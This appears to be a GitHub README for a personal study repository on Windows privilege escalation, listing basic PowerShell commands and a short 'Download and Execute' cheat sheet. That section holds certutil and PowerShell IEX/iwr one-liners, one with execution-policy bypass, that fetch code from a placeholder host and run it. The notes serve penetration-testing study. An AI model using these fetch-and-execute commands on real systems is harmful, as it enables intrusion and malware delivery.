# WindowsPrivEsc
Repository on Windows Privilege Escalation, It contains helpful resources which can guide you escalating your privileges on Windows. I was noting all of the Privilege Escalation methods and vectors while I was studying it. Please go through it and you may find it helpful. Also, Small CheatSheets can be found here which can be important. Will keep updating it!


## PowerShell Basic Commands:

`Get-ChildItem` (Displays all the contents in the current directory)

`Get-Alias` (Displays all the aliases)

`Set-Alias` (Setup your Alias)

`$profile` (Lists your powershell profile, for eg: `"C:\Users\user\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1"`)

`Import-Module ./PowerUp.ps1` (Imports a PowerShell Script Module)

`Remove-Item` (Delete any file or folder)

`Import-Alias` (Import aliases)

## Download and Execute:

### CertUtil:

`certutil -urlcache -f http://127.0.0.1/sample.exe C:\temp\sample.exe && C:\temp\sample.exe`

### PowerShell:

`Invoke-WebRequest "http://127.0.0.1/sample.exe" -OutFile "C:\temp\sample.exe"` (This will only download the file)

`echo IEX(New-Object Net.WebClient).DownloadString('http://127.0.0.1/sample.exe') | powershell -noprofile -`

`powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://127.0.0.1/sample.ps1')|iex"`

# Socials

TwitterID: https://twitter.com/BhalgamaVedant 

YouTube: https://www.youtube.com/channel/UCIlMtOiRDi1luvhtjczvjJw 
